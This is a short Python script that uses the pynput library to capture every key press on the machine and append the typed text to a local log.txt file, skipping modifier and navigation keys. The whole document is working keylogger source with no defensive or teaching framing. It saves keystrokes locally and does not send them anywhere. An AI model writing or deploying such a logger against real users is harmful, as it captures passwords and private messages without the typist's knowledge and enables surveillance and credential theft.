# install pynput package
from pynput.keyboard import Listener

list_of_words = ['Key.shift_r', 'Key.ctrl_l', 'Key.backspace', 'Key.shift', 'Key.ctrl_r', 'Key.alt_l', 'Key.alt_r',
                 'Key.tab', 'Key.esc', 'Key.down', 'Key.left', 'Key.right', 'Key.up', 'Key.menu',
                 'Key.num_lock', 'Key.page_down', 'Key.page_up', 'Key.home', 'Key.end', 'Key.insert', 'Key.delete']


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    for word in list_of_words:
        if word == letter:
            letter = ''
    if letter == "Key.enter":
        letter = "\n"
    with open('log.txt', 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as l:
    l.join()
